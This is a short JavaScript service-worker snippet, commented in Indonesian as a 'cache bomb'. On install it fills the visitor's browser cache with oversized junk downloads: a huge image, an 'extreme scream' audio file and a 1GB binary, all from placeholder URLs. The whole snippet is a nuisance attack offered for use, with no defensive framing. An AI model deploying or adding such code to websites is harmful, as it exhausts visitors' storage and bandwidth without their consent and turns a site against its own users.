// Bom Cache: Isi cache dengan file sampah besar
self.addEventListener('install', (e) => {
    e.waitUntil(
        caches.open('CACHE-SETAN').then((cache) => {
            return cache.addAll([
                'https://i.imgur.com/UNREAL-HUGE-IMAGE.jpg',
                'https://example.com/jeritan-extreme.mp3',
                'https://example.com/file-sampah-1GB.bin'
            ]);
        })
    );
});
